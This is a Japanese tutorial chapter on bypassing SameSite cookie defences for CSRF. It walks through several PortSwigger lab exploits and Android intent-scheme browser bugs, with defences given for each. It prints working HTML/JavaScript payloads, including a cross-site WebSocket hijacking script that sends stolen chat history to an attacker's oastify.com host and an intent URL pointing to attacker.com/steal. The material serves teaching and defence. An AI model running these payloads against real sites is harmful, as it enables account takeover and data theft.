# 第4章 SameSite時代の高度なCSRF

## SameSite bypass理論とPortSwiggerラボ

SameSite Cookie属性は、2020年代のCSRF（Cross-Site Request Forgery: 被害者のブラウザに保存された認証情報を悪用し、意図しない状態変更リクエストを送らせる攻撃）対策の主役になりました。多くのフレームワークが「トークンを付けなくてもSameSite=Laxがデフォルトだから安全」と暗黙に前提するようになった結果、逆に「SameSiteをどう回避するか」という一段深い攻防が生まれています。本節では、SameSiteの内部挙動を仕組みレベルで押さえたうえで、PortSwigger Web Security Academyの3つのラボ（method override / cookie refresh / client-side redirect）を通じて、実際にどこで境界が崩れるのかを解説します。

> 本節は防御目的の解説です。ここで扱うペイロードは、いずれもPortSwiggerが公式に提供する学習用ラボ環境（`web-security-academy.net`）内でのみ実行するものであり、実在のサービスや本番環境に対する無許可の検証には使わないでください。

---

### SameSiteの三段階を仕組みから理解する

SameSiteは「あるサイトが発行したCookieを、別サイト（cross-site）を起点とするリクエストに含めるかどうか」を制御するブラウザ側のセキュリティ機構です。値は3つあります。

- **`Strict`**: あらゆるクロスサイトリクエストでCookieを送らない。アドレスバーに表示されているサイトと、リクエスト先サイトが一致しなければ、Cookieは付与されません。最も強力だが、外部リンクから遷移してきた直後にログイン状態が失われる（未ログインに見える）などUXの副作用があります。
- **`Lax`**: クロスサイトでも、次の**両方**の条件を満たすときだけCookieを送ります。
  1. リクエストのメソッドが**GET**であること
  2. ユーザーによる**トップレベルナビゲーション**（アドレスバーのURLそのものが変わる遷移。例: リンクのクリック）の結果であること
- **`None`**: SameSite制限を事実上無効化し、発行元サイトへの全リクエストでCookieを送る。ただし`Secure`属性（HTTPS必須）が併せて必要です。

```
Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

#### なぜ「Laxがデフォルト」なのかと、その落とし穴

2021年以降、**Chromeは、発行時にSameSite属性を明示していないCookieに対して、デフォルトで`Lax`相当の制限を適用**します。これがCSRF対策の土台になった一方で、二つの重要な副作用があります。

第一に、`Lax`は「GET かつ トップレベルナビゲーション」なら通してしまうため、**状態変更をGETで受け付けるエンドポイントがあると、それだけでLaxを突破できる**（後述のmethod overrideラボ）。

第二に、Chromeには「**Lax+POST 2分間の猶予ウィンドウ**」と呼ばれる互換性のための例外があります。SameSite属性を**明示していない**Cookieに限り、**発行（Set-Cookie）から約120秒（2分）以内**であれば、トップレベルナビゲーションによるクロスサイトの**POST**リクエストでもCookieを送ります。これは、OAuthのシングルサインオンのようにクロスサイトPOSTでセッションを確立する古い実装を壊さないための緩和策です。**この120秒の窓こそがcookie refreshラボの攻撃面**になります。逆に言えば、開発者が明示的に`SameSite=Lax`（や`Strict`）を設定していれば、この猶予は適用されません。属性の「明示 vs 未指定（デフォルト）」で挙動が変わる点が核心です。

#### 「site」と「origin」は違う — ここが多くの誤解の元

SameSiteの判定は**origin（オリジン）ではなくsite（サイト）**を単位にします。両者は似て非なるものです。

- **origin**: スキーム・ドメイン名・ポートが**完全一致**するもの同士。
- **site**: **TLD+1**（実効トップレベルドメイン + その1つ下のラベル）。加えてスキームも考慮されます。

たとえば `app.example.com` と `intranet.example.com` は**オリジンは異なる（cross-origin）が、サイトは同じ（same-site）**です。ここから導かれる決定的な結論が次です。

> **クロスオリジンのリクエストでも、same-siteであり得る。しかし逆は成り立たない。**

つまり `example.com` 配下のいずれかのサブドメイン（兄弟ドメイン、sibling domain）にXSSなどの「任意の二次リクエストを発生させる隙」があれば、それはsame-site扱いとなり、`SameSite=Strict`のCookieすらリクエストにできてしまうためStrict防御が丸ごと崩れます。なお、スキームも判定に入るため、`http://app.example.com` から `https://app.example.com` への遷移は**cross-site**と扱われます。

> 出典: Bypassing SameSite cookie restrictions — https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions

---

### ラボ1: SameSite Lax bypass via method override

#### 状況と正常時の防御

対象は `POST /my-account/change-email`（メールアドレス変更）。このエンドポイントは以下の状態にあります。

- 予測不能なCSRFトークンが**ない**
- Cookieに明示的なSameSite指定が**ない**（=Chromeデフォルトの`Lax`が効く）

`Lax`のもとでは、クロスサイトからの**POST**リクエストにはセッションCookieが付かないため、素朴なCSRF（自動送信フォームでPOST）は失敗します。ここまでは意図通りの防御です。

#### なぜ突破できるのか — メソッドオーバーライドという裏口

多くのWebフレームワーク（Symfony、Laravel、Rails等）は、HTMLフォームがGET/POSTしか送れない歴史的制約を補うため、**リクエストの見かけ上のメソッドを、ボディやクエリの特殊パラメータで上書きする**機能を備えています。代表例が `_method` パラメータです。サーバはルーティング時にこの値を「本当のメソッド」として採用します。

この挙動を悪用すると、**ブラウザから見れば安全なGETリクエスト**でありながら、**サーバから見ればPOST（状態変更）**という二枚舌のリクエストが作れます。GETかつトップレベルナビゲーションなので`Lax`の2条件を満たし、セッションCookieが同送される。しかしサーバは`_method=POST`を見てメール変更処理を実行してしまう、というわけです。

#### エクスプロイト

```html
<script>
document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```

なぜこれで成立するのか、を分解します。

1. `document.location` への代入は**トップレベルナビゲーション**を発生させる（アドレスバーのURLそのものが変わる）。これで`Lax`条件2を満たす。
2. 遷移はHTTP **GET**として飛ぶので、`Lax`条件1も満たす。→ セッションCookieが付与される。
3. サーバはクエリの `_method=POST` を優先し、この要求を`POST /my-account/change-email`として処理する。→ `email`が書き換わる。

被害者はエクスプロイトサーバ上のリンク（またはページ）にアクセスするだけで、リダイレクト先で自分のセッションが使われてメールが変更されます。攻撃者はメールを掌握できれば、パスワードリセット経由でアカウントを乗っ取れます。

#### 防御

- 状態変更エンドポイントで**メソッドオーバーライドを無効化**する（`_method`等を受理しない）。少なくとも認証済み・状態変更系ではGETでの実行経路を塞ぐ。
- 状態変更に**CSRFトークン**を必須にする（SameSiteは多層防御の一層であって単独の解ではない）。
- Cookieに**明示的な`SameSite`**を設定し、可能なら`Strict`にする。

> 出典: Lab: SameSite Lax bypass via method override — https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override

---

### ラボ2: SameSite Lax bypass via cookie refresh（2分猶予ウィンドウ / OAuth）

> ⚠️ **未取得の資料**: 「Lab: SameSite Strict bypass via cookie refresh」の公式ラボページは、自動取得時に親記事（SameSite解説記事）の内容へフォールバックしてしまい、ラボ固有本文を直接取得できませんでした（理由: 動的ページのため本文が展開されず、上位記事へ丸められた）。以下のURLからご自身で直接ご覧ください: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
> 以下は、公式ラボ説明・コミュニティWriteup（siunam321氏の解説等）・PortSwigger本文で公開されている情報に基づく再構成です。

（補足として一般知識および公開Writeupに基づく解説です）

#### 状況

- 対象は同じく `POST /my-account/change-email`。CSRFトークンは**ない**。
- サイトは**OAuthによるソーシャルログイン**をサポートする（ラボの資格情報は `wiener:peter`）。
- 名前は「Strict bypass」だが、鍵になるのは「Set-Cookie時に**SameSiteを明示していない**」点で、実効的にはChromeデフォルトの`Lax`と、その**2分猶予ウィンドウ**が舞台になります。

#### なぜ突破できるのか — OAuthコールバックが「属性なしCookie」を焼き直す

このサイトでは、OAuthフローの最後の `GET /oauth-callback` に対するレスポンスで**セッションCookieを再発行する際、SameSite制限を一切指定していません**。属性未指定なのでブラウザはデフォルトの`Lax`を適用します。前述のとおり、**属性未指定Cookieには「発行から約120秒以内なら、トップレベルのクロスサイトPOSTでも送る」猶予**が働きます。

したがって攻撃の骨子は「**まず被害者のブラウザにOAuthのcookie refreshを踏ませてタイマーをリセットし、その直後（2分以内）にクロスサイトPOSTのCSRFを撃ち込む**」となります。cookie refreshを起こす入口が `/social-login`（OAuthの開始点）で、被害者が既にIdP側でログイン済みなら、フローは自動的に進んで `/oauth-callback` に到達し、新鮮なセッションCookieが焼き直されます。

#### エクスプロイト

ポイントは二つ。(1) cookie refreshは**別タブ/別ウィンドウ**で起こし、攻撃ページ自身が遷移して離脱しないようにする。(2) `window.open()` はユーザー操作なしだとポップアップブロックされるため、`onclick`（クリック）を起点にする。

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
    window.onclick = () => {
        // 1) 別ウィンドウでOAuthのcookie refreshを起動 → session Cookieが焼き直され、120秒タイマーがリセットされる
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        // 2) 数秒待ってOAuthフローが /oauth-callback まで完了するのを待ってから、CSRFのPOSTを送る
        setTimeout(changeEmail, 5000);
    };
    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

なぜこの順序と待機が必要か。

- `window.open('/social-login')`: 別ウィンドウでOAuth開始点へ飛ばす。被害者はIdPで認証済みなので、リダイレクトが連鎖して `/oauth-callback` に到達し、そこでSameSite属性なしのセッションCookieが**再発行**される。この瞬間が2分ウィンドウの始点。
- `setTimeout(..., 5000)`: OAuthのリダイレクト連鎖が完了しCookieが焼き直されるまでの時間を確保する。早すぎるとまだ古いCookie（または未確立）で撃ってしまう。
- `document.forms[0].submit()`: メインウィンドウの隠しフォームを送信。これはクロスサイトの**POST**だが、直前のrefreshにより「属性なしCookie・発行後120秒以内」の条件を満たすため、セッションCookieが同送されメール変更が成立する。
- なぜ**別ウィンドウ**か: refreshを同一ウィンドウで行うと攻撃ページから離脱してしまい、最後のフォーム送信ができなくなる。別ウィンドウに逃がすことで攻撃ページを保持する。

#### 防御

- セッションCookieには**明示的に`SameSite=Strict`（最低でもLax）を設定**する。属性を明示すれば、Chromeの「属性なし限定・120秒猶予」の対象から外れる。
- OAuthコールバックを含む**すべてのSet-Cookieでポリシーを一貫**させる（一箇所でも属性を落とすと全体が緩む）。
- 状態変更にCSRFトークンを併用する。

> 出典: Lab: SameSite Lax bypass via cookie refresh — https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
> 参考（Writeup）: siunam's Website — https://siunam321.github.io/ctf/portswigger-labs/CSRF/csrf-10/

---

### ラボ3: SameSite Strict bypass via client-side redirect（ガジェット）

#### 状況と正常時の防御

- 対象は `/my-account/change-email`。CSRFトークンは**なし**だが、今回はセッションCookieに**明示的な`SameSite=Strict`**が設定されている。
- `Strict`はGET/POSTを問わず、あらゆるクロスサイトリクエストでCookieを落とすため、method overrideも2分猶予（属性明示済みなので不適用）も効かない。素直には手が出ません。

#### なぜ突破できるのか — クライアントサイドリダイレクトは「リダイレクトではない」

鍵は「**同一サイト内で二次リクエストを起こせるガジェット（gadget: それ自体は脆弱性でなくても、攻撃を成立させる部品となる正規機能）**」を見つけることです。ここでのガジェットは**クライアントサイド（DOMベース）リダイレクト**、つまりJavaScriptが `location` を書き換えて別URLへ飛ばす仕掛けです。

決定的な原理は次の一文に集約されます。

> クライアントサイドリダイレクトは、そもそも「リダイレクト」ではない。結果として飛ぶリクエストは、独立した通常のリクエストとして扱われる。そしてそれは**same-siteリクエスト**なので、SameSite制限に関わらずサイトの全Cookieを含む。

サーバサイドリダイレクト（HTTP 3xx + `Location`）では、ブラウザは「最初のリクエストがクロスサイト起点だった」ことを覚えており、リダイレクト追従先にもcross-site扱いを引き継ぐため、Cookieは落ちます。ところがJavaScriptによる遷移はブラウザにとって「そのサイト上のページが自発的に起こした新しいトップレベルナビゲーション」でしかなく、**アドレスバーが対象サイトになっている状態からの遷移＝same-site**と判定されます。ここに`Strict`の盲点があります。

#### 脆弱なエンドポイントとペイロード構築

このラボのガジェットはコメント投稿後の確認ページ `GET /post/comment/confirmation?postId=<...>` です。ここは `/resources/js/commentConfirmationRedirect.js` を読み込み、**`postId`パラメータの値を使ってクライアントサイドで遷移先パスを組み立てます**。この`postId`が**パストラバーサル（`../`）を通してしまう**ため、任意の同一サイト内エンドポイントへ遷移先を捻じ曲げられます。

```
/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1
```

構築上の注意点。

- `1/../../my-account/change-email` : `postId`の値の中で`../`を使い、JS側が組み立てるパスを `/my-account/change-email` に化けさせる。
- `%40` : `@` のURLエンコード。
- `%26` : `&` のURLエンコード。**ここが要点**で、`&`を生のまま書くと、その時点でURLのクエリ区切りとして解釈され、`email`や`submit`が「`postId`の続き」ではなく「確認ページ自身のクエリ」になってしまう。`%26`とすることで、いったん`postId`の値の一部として運ばれ、JSがリダイレクト先URLを組み立て直したときに初めて`&`として展開され、`email=...&submit=1`という2パラメータになる。
- `submit=1` : 変更処理を実行させるためのパラメータ。`change-email`エンドポイントがGETでも`email`と`submit`を受理するため、GET遷移だけで変更が完了する。

#### エクスプロイト

```html
<script>
document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```

流れを追うと、

1. 攻撃ページの`document.location`代入で、被害者のブラウザが**クロスサイトで**確認ページ `GET /post/comment/confirmation?...` に飛ぶ。この最初のリクエストは`Strict`なのでセッションCookieは**付かない**が、確認ページ自体は認証不要なので表示される。
2. 読み込まれた `commentConfirmationRedirect.js` が`postId`の値からリダイレクト先を組み立て、`../`によって `/my-account/change-email?email=...&submit=1` へ**JavaScriptで遷移**する。
3. この二次遷移は、ブラウザから見れば「対象サイト上のページ（アドレスバーは既に対象サイト）が起こしたsame-siteナビゲーション」。よって`SameSite=Strict`のセッションCookieが**同送**され、メール変更が実行される。

つまり、直接クロスサイトで`change-email`を叩くのではなく、いったん同一サイトのページに着地してから、そのページのJSに二次リクエストを踏ませる「ワンクッション」で`Strict`を回避しているわけです。

#### 防御

- クライアントサイドリダイレクトの遷移先を**ユーザー入力から組み立てない**。どうしても必要なら、許可リスト（allowlist）で遷移先を厳格に制限し、`../`等のパストラバーサルを正規化・拒否する。
- 状態変更にCSRFトークンを必須化する（same-site二次リクエストでもトークンが無ければ弾ける）。
- 状態変更をGETで実行可能にしない。

> 出典: Lab: SameSite Strict bypass via client-side redirect — https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

---

### まとめ — SameSiteは「単独の解」ではない

本節の3ラボは、いずれも「SameSiteがあるから安全」という思い込みの隙を突いています。攻防の要点を整理します。

- **method override**: `Lax`は「GET+トップレベルナビゲーション」を通す。状態変更をGET（`_method`等の裏口含む）で実行できると、そのままLaxを越えられる。
- **cookie refresh**: SameSite**属性を明示していない**Cookieには、Chromeの**約120秒（2分）猶予**でクロスサイトPOSTが通る。OAuthコールバックがこの「属性なしCookie」を焼き直すため、refresh→即CSRFで突破できる。属性を明示すれば猶予対象から外れる。
- **client-side redirect**: `Strict`でも、同一サイト内のJSベース遷移ガジェットに二次リクエストを起こさせれば、それはsame-site扱いになりCookieが乗る。ユーザー入力由来のリダイレクト先が導火線。
- 通底する原理として、**site≠origin**（兄弟ドメインのXSS等でStrictも崩れる）と、**属性の明示 vs 未指定でブラウザ挙動が変わる**点を必ず押さえること。

防御側の結論はシンプルです。**SameSiteは多層防御の一層に過ぎず、状態変更には必ずCSRFトークンを併用し、状態変更をGETで受け付けず、Cookieには明示的にSameSite（可能なら`Strict`）を設定し、全Set-Cookieでポリシーを一貫させる**こと。ここまで揃えて初めて、本節の各バイパスは成立しなくなります。

> 出典: Bypassing SameSite cookie restrictions — https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions

## sibling domainとSameSite bypass実践write-up

SameSite Cookie が普及した現在（2020年以降、Chrome では既定値が `SameSite=Lax` に変更済み）でも、CSRF や関連攻撃は死んでいない。むしろ「SameSite があるから安全」という思い込みが、開発者の防御を薄くしている。この節では、SameSite を「回避（bypass）」する 3 つの代表的な実戦テクニックを、実際の write-up・研究をもとに仕組みレベルで解剖する。

- **sibling domain（兄弟ドメイン）経由**の SameSite Strict 突破と、CSWSH（Cross-Site WebSocket Hijacking）連携
- **Method Override（メソッド上書き）**による SameSite Lax の突破
- **intent スキーム（Android）**による SameSite Strict のブラウザ実装バグ突破

いずれも共通する原理は「**ブラウザが `same-site`（同一サイト）と判定する条件と、攻撃者が実際に狙う操作の危険性が一致していない**」という点にある。まずこの前提を押さえておこう。

### 前提: 「same-site」判定は eTLD+1 単位、しかも緩い

SameSite Cookie の可否は、リクエストの**送信元（initiator）**と**宛先（target）**が「same-site かどうか」で決まる。ここで言う site とは「スキーム + eTLD+1（登録可能ドメイン）」である。eTLD（effective Top-Level Domain、実効トップレベルドメイン。`.com` や `.co.jp`、`.web-security-academy.net` のように「その下は誰でも登録できる」境界）に、その 1 つ左のラベルを足したものが eTLD+1 だ。

重要なのは、**same-site はホスト名の完全一致ではない**ということ。`a.example.com` と `b.example.com` はホストが違っても、eTLD+1 が同じ `example.com` なので **same-site** と扱われる。この「兄弟（sibling）関係のサブドメインは同一サイト」という緩さが、最初の攻撃の入口になる。

さらに `SameSite=Lax`（既定値）には抜け穴がある。Lax は「**トップレベルナビゲーション**（ユーザーがリンクを踏む・`window.location` で遷移するような、アドレスバーが変わる遷移）**かつ安全なメソッド（GET/HEAD）**」であれば、クロスサイトでも Cookie を送る。これが 2 つ目の攻撃（Method Override）の入口になる。

---

### 1. sibling domain 経由の SameSite Strict 突破 + CSWSH

#### 攻撃シナリオの全体像

PortSwigger の Web Security Academy ラボ「SameSite Strict bypass via sibling domain」は、次の連鎖を示している。

1. メインアプリ（`YOUR-LAB-ID.web-security-academy.net`）にチャット機能があり、**WebSocket ハンドシェイクに CSRF トークンが無い** → CSWSH に脆弱
2. しかしセッション Cookie は `SameSite=Strict` なので、**外部サイトから直接** WebSocket を張ってもハンドシェイクに Cookie が乗らず、他人のセッションを乗っ取れない（新規セッションの履歴しか取れない）
3. ところが**兄弟ドメイン**である CMS（`cms-YOUR-LAB-ID.web-security-academy.net`）にリフレクテッド XSS がある
4. 攻撃者は被害者を CMS の XSS に誘導 → **CMS 上で動く JavaScript は「same-site」**なので、そこから張った WebSocket には `SameSite=Strict` の Cookie が正しく乗る → CSWSH が成立し、チャット履歴（＝認証情報）を盗める

つまり「**同一サイト内の 1 ドメインを XSS で奪えば、SameSite=Strict は事実上無力化される**」。SameSite はサイト**間**の防御であって、サイト**内**の乗っ取りには何の効果も無い、という教訓だ。

用語を補足すると:
- **CSWSH（Cross-Site WebSocket Hijacking）**: WebSocket の接続確立（ハンドシェイク）が HTTP リクエストとして飛ぶことを利用し、攻撃者ページから被害者の Cookie 付きで WebSocket を張って、双方向通信を乗っ取る攻撃。ハンドシェイクに CSRF トークンや Origin 検証が無いと成立する。
- **sink（シンク）**: 入力が最終的に実行・解釈される危険な代入先。ここでは CMS ログインの `username` パラメータが、無害化されずに HTML へ反映される sink になっている。

#### CSWSH のペイロード

まず、CSWSH 本体となるスクリプトはこれだ。

```javascript
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

**なぜこれで履歴が盗めるのか**:
- `new WebSocket('wss://.../chat')` を CMS 上（same-site コンテキスト）で実行すると、ハンドシェイクの HTTP リクエストに `SameSite=Strict` のセッション Cookie が乗る。サーバは正規ユーザーとして接続を受け入れる。
- このアプリのサーバは `"READY"` を受け取ると**チャット履歴全体を送り返す**仕様。`ws.send("READY")` でそれを引き出す。
- `ws.onmessage` で受け取ったデータ（`event.data`）を、`fetch(..., {mode:'no-cors'})` で攻撃者の Burp Collaborator（`oastify.com`）へ POST 送信して外部流出（exfiltration）させる。`mode:'no-cors'` はレスポンスを読めない代わりに CORS プリフライトを避け、単純に「送りつける」ためのモード。

#### 兄弟ドメインの XSS へ注入する

上の CSWSH スクリプトを、CMS ログインの `username` パラメータ（無害化されない反射点）に注入する。まず XSS 自体の確認は次のように行える。

```
https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=<script>alert(1)</script>&password=anything
```

そして被害者を誘導する最終エクスプロイト（攻撃者ドメインに置くページ）は次の形になる。CSWSH スクリプトを **URL エンコードして** `username` に埋め込む。

```javascript
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

**なぜ `document.location` による遷移なのか**:
- 攻撃者ページ（クロスサイト）から CMS へ**トップレベルナビゲーション**で遷移させる。遷移先の CMS 上で XSS が発火すると、そのスクリプトの実行コンテキストは `cms-....web-security-academy.net`、すなわちメインアプリと **eTLD+1 が同じ same-site** になる。
- したがって、その中で張る WebSocket は same-site リクエストとなり、`SameSite=Strict` Cookie が乗る。ここが突破の核心だ。攻撃者ページから直接 WebSocket を張ったのでは cross-site 扱いで Cookie が乗らないが、「一度 same-site の XSS を踏み台にする」ことでこの壁を越える。

#### 兄弟ドメインの見つけ方

このラボでは、メインアプリのレスポンスに含まれる `Access-Control-Allow-Origin` ヘッダから CMS ドメインの存在を推測できる。実務でも、CORS 設定・CSP の `connect-src`／`frame-ancestors`・リンク・証明書の SAN（Subject Alternative Name）・サブドメイン列挙などから兄弟ドメインを洗い出すのが定石になる。

#### 防御

- **XSS を根絶する**のが第一。SameSite は same-site の XSS を前提にすると無力なので、出力エスケープ・CSP を徹底する。
- WebSocket ハンドシェイクに **CSRF トークンを必須化**し、**Origin ヘッダを厳格に検証**する（`Origin` がアプリ本体のオリジンと完全一致する場合のみ受理。兄弟ドメインからの接続も拒否する）。
- サブドメインを分離し、信頼できないコンテンツ（CMS 等）は eTLD+1 を分けた別サイトに置く（例: 完全に別のドメイン）。そうすれば sibling 扱いにならず SameSite の壁が復活する。
- セッション Cookie に加えて重要操作へ再認証・トークンを求める。

> 出典: PortSwigger Web Security Academy — Lab: SameSite Strict bypass via sibling domain — https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

---

### 2. Method Override による SameSite Lax 突破

#### なぜ Lax は「GET だけ許す」のか、そこが穴になる

`SameSite=Lax`（Chrome 80 以降の既定値）は、クロスサイトからのリクエストでも「**トップレベルナビゲーション かつ GET/HEAD**」であれば Cookie を送る。ログイン状態を保ったまま外部リンクから普通に遷移できるようにするための緩和策だ。逆に言えば、**クロスサイトの POST には Cookie を送らない** → これが CSRF 対策として機能する、という設計になっている。

ここで多くの Web フレームワークが持つ「**HTTP Method Override（メソッド上書き）**」機能が牙を剥く。HTML の `<form>` は歴史的経緯から GET と POST しか送れないため、`PUT`／`DELETE`／`PATCH` を使いたい RESTful なアプリのために、フレームワークは次の 2 つの手段で「見かけの GET/POST を、サーバ側で別メソッドに読み替える」機能を用意している。

- **`_method` パラメータ**: フォームの hidden フィールドや、クエリ文字列に `_method=PUT` を入れると、サーバはそのリクエストを PUT として処理する。
- **`X-HTTP-Method-Override` ヘッダ**: 同じことをヘッダで行う。

この読み替えが攻撃者にとって都合が良いのは、「**ブラウザは実際に飛んだメソッド（GET）だけを見て SameSite を判定するが、サーバは上書き後のメソッド（POST/PUT/DELETE）で状態変更処理を実行する**」という**判定の不一致**を作り出せるからだ。

#### 攻撃の流れ

1. 本来は POST/PUT/DELETE でしか受け付けない状態変更エンドポイント（送金・パスワード変更など）を狙う
2. 攻撃者は被害者を、**GET のトップレベルナビゲーション**でそのエンドポイントに遷移させる。URL に `_method` を付けて上書きを仕込む
3. ブラウザから見れば「GET のトップレベルナビゲーション」なので、`SameSite=Lax` の Cookie が乗る
4. サーバは `_method` を読み取り、POST/PUT/DELETE として**認証済みの状態変更**を実行してしまう

原典が示す最小の PoC は次の通り。

```javascript
<script>
    document.location = "https://hazanasec.github.io/send?amount=1000&_method=POST";
</script>
```

**なぜこれで突破できるのか**:
- `document.location` への代入は GET のトップレベルナビゲーション → Lax でも Cookie が送られる。
- サーバ側フレームワークが `_method=POST`（記事の例では GET エンドポイントを POST 扱いに読み替えるケース。実際には「本来 POST 必須の処理を GET で叩けるようにする」向きが典型的に危険）を解釈し、状態変更ハンドラを起動する。
- ポイントは「攻撃者は POST リクエストを一切送っていない（＝クロスサイト POST の SameSite 制限を踏まない）のに、サーバ側では POST 相当の処理が走る」こと。

フォーム版も紹介されている。フォーム送信も**トップレベルナビゲーション**と見なされるため、method override を仕込んでも Cookie が乗る。

```html
<form action="https://example.com/transfer" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
```

ヘッダ版はこうだ（JavaScript で任意ヘッダを付けられる状況、あるいはヘッダ上書きを許すプロキシ・ミドルウェア構成で成立する）。

```http
POST /transfer HTTP/1.1
X-HTTP-Method-Override: GET
```

#### 影響を受けるフレームワーク

原典は、`_method` パラメータや `X-HTTP-Method-Override` ヘッダを（標準または一般的なミドルウェアで）解釈するフレームワークを幅広く列挙している。

| フレームワーク | `_method` パラメータ | `X-HTTP-Method-Override` ヘッダ |
|---|---|---|
| Symfony / Rails / Laravel / CodeIgniter | 対応 | 対応 |
| CakePHP / Yii / Ember.js / Meteor | 対応 | 対応 |
| Flask / Django / Spring MVC / ASP.NET Core | パラメータは非対応 | 対応 |
| Express.js / Koa.js / Bottle | ミドルウェアで対応 | 対応 |
| Phoenix | 対応 | 対応 |

（列挙は原典時点＝2023年7月の記述に基づく。既定で有効か、明示的に導入したミドルウェアで有効かはフレームワークにより異なるので、自分のスタックの実際の挙動を必ず確認すること。）

#### 防御

- 状態変更エンドポイントでは**メソッド上書きに依存しない**。特に「本来 POST 必須の処理が `_method` で GET から叩ける」構成を排除する。
- 不要なら **method override ミドルウェアを本番で無効化**する。
- SameSite に頼らず、**メソッド非依存の CSRF トークン**を必須化する（トークンが無ければ、GET だろうが上書きだろうが弾かれる）。これが最も確実。
- 機微な操作には `SameSite=Strict` を併用し、さらに再認証を求める。

> 出典: hazanasec — Bypassing SameSite Cookie restriction with method override — https://hazanasec.github.io/2023-07-30-Samesite-bypass-method-override.md/

---

### 3. Android の intent スキームによる SameSite Strict 突破（ブラウザ実装バグ）

これまでの 2 つが「仕様の穴・アプリ側の設定ミス」を突くものだったのに対し、これは**ブラウザ実装のバグ**による SameSite Strict の突破である。時事性が強いので、対象バージョンと修正状況を明記して読む必要がある。

#### intent スキームとは

Android の **intent スキーム（`intent://` URL）**は、ブラウザから他アプリを起動するための外部プロトコルハンドラだ。例えばブラウザから地図アプリへ、SMS からブラウザへ、といった「アプリ間の橋渡し」を担う。構文は次のようになっている。

```
intent://<host/path>#Intent;scheme=<scheme>;package=<package>;S.browser_fallback_url=<url>;end
```

`S.browser_fallback_url` は「指定パッケージのアプリが存在しない・起動できない場合に、代わりにブラウザで開く URL」を指定する **fallback（フォールバック、代替遷移先）**だ。

#### バグの本質: fallback 遷移が「same-site 相当」に化ける

セキュリティ研究者 Axel Chong が発見したのは、**Web サーバが `intent://` URL への HTTP リダイレクトを発行すると、`SameSite=Strict` の Cookie が乗ってしまう**という Chromium（Android 版 Chrome）の挙動だった。本来クロスサイトのリダイレクトでは Strict Cookie は送られないはずなのに、intent 経由の遷移がこの判定をすり抜ける。同時に、リクエストの出所を示す **`Sec-Fetch-Site` ヘッダも回避**されてしまう。どちらも CSRF 対策の要なので、両方を無力化できることになる。

Certus Cybersecurity の解説では、次のように「`/poc` パスが intent へのリダイレクトを返す」構成で再現している。

```http
HTTP/1.1 302 Found
Location: intent://httpbin.org/headers#Intent;scheme=https;package=com.android.chrome;end
```

被害者が攻撃者ページ（`/poc`）を Chrome mobile で開くと、この intent リダイレクトによって `httpbin.org` へ遷移するが、その際 `SameSite=Strict` Cookie が乗ってしまう、という流れだ。

Firefox for Android（CVE-2022-45413）では、より明確に **fallback URL の悪用**として現れた。

```
intent://192.168.1.70#Intent;scheme=http;package=garbage;S.browser_fallback_url=http://attacker.com/steal;end
```

**なぜこれで突破できるのか**:
- `package=garbage`（存在しないパッケージ名）を指定すると、intent の起動が失敗する。
- 失敗すると `S.browser_fallback_url` の URL がブラウザで読み込まれるが、この fallback ロードが「外部由来（external）」として適切なフラグ付けをされず、**`SameSite=Strict` Cookie の制限を考慮しないまま**リクエストが飛ぶ。
- 結果として、クロスサイトのはずの遷移に Strict Cookie が乗り、CSRF の踏み台になる。

#### 対象バージョンと修正状況

- **Chromium / Android 版 Chrome**: 研究者は **109.0.5397.0（Android Chrome Canary、2022年11月）**で修正を確認。当時 `chrome://flags/#enable-experimental-cookie-features` を有効化すると、通常のリダイレクトで SameSite Cookie が送られない安全な挙動に戻せた（暫定回避策）。The Daily Swig の報道は 2023年3月。
- **Firefox for Android（CVE-2022-45413）**: **105〜106 が影響（当初 wontfix）**、**107 以降で修正**。修正内容は、fallback URL の `loadUrl` 呼び出しに `external()` フラグを立て、cross-site ロードとして Cookie 送信を正しく制限するもの。

> ⚠️ **一部未取得の資料**: 元記事「The Daily Swig: Chromium bug allowed SameSite cookie bypass on Android devices」本文は自動取得できませんでした（理由: WebFetch が PortSwigger のトップページを返し記事本文に到達できなかったため）。以下の URL からご自身で直接ご覧ください: https://portswigger.net/daily-swig/chromium-bug-allowed-samesite-cookie-bypass-on-android-devices
>
> 上記の技術詳細は、同記事の検索スニペット、Mozilla Bugzilla（CVE-2022-45413）、Certus Cybersecurity の解説記事から補完しています。

#### 防御

- **ブラウザを最新に保つ**（Chrome 109 以降、Firefox 107 以降）。これは実装バグなので、恒久対策はベンダ修正の適用が本筋。
- アプリ側では、**自サイトへ跳ね返る `intent://` リダイレクトを生成しない**（オープンリダイレクトの一種として intent スキームを扱い、リダイレクト先をホワイトリスト化する）。
